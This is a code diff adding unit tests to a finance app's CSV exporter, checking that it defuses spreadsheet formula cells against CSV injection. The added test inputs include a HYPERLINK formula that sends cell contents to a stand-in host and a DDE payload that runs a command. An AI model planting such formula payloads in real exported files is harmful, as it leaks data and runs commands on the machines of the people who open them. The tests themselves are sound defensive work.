@@ -86,6 +86,8 @@ function unitChecks() {
   ok(parseDay("05/03/2026") === "2026-03-05" && parseDay("05-Mar-26") === "2026-03-05" && parseDay("2026-03-05") === "2026-03-05" && parseDay("5 Mar 2026") === "2026-03-05", "parseDay: day-first Indian formats");
   ok(JSON.stringify(parseCsv('a,"b,""c""",d\r\n1,2,3\n')) === JSON.stringify([["a", 'b,"c"', "d"], ["1", "2", "3"]]), "parseCsv: quotes, doubled quotes, CRLF");
   ok(toCsv(["a", "b"], [["x,y", 5]]) === 'a,b\r\n"x,y",5\r\n', "toCsv quotes commas, CRLF lines");
+  ok(toCsv(["a", "b", "c", "d"], [['=HYPERLINK("https://x.example/?c="&A1,"OPEN")', "=cmd|'/c calc'!A1", "@SUM(A1)", "+1+1"]]) === 'a,b,c,d\r\n"\'=HYPERLINK(""https://x.example/?c=""&A1,""OPEN"")",\'=cmd|\'/c calc\'!A1,\'@SUM(A1),\'+1+1\r\n', "toCsv defuses formula cells (= + @, CSV injection)");
+  ok(toCsv(["a", "b", "c", "d"], [["-1234.50", -5, "-x", "\tcmd"]]) === 'a,b,c,d\r\n-1234.50,-5,\'-x,\'\tcmd\r\n', "toCsv keeps negative amounts numeric, defuses - and tab before text");
   ok(placeOfSupply({ branch: { stateCode: "22" } }) === "22" && placeOfSupply({ branch: { stateCode: "22" }, customer: { gstin: "27AAACM1234B1Z5" } }) === "27" && placeOfSupply({ branch: { stateCode: "22" }, override: "29" }) === "29", "placeOfSupply: override > customer > branch");
   const cfg = DEFAULT_FINANCE_CONFIG.tds;
   ok(computeTds({ sharePaise: 100000, priorSharePaise: 0, priorBasePaise: 0, partner: { pan: undefined, tds: null }, config: cfg }).rateBp === cfg.noPanRateBp, "TDS: no PAN → the no-PAN rate");
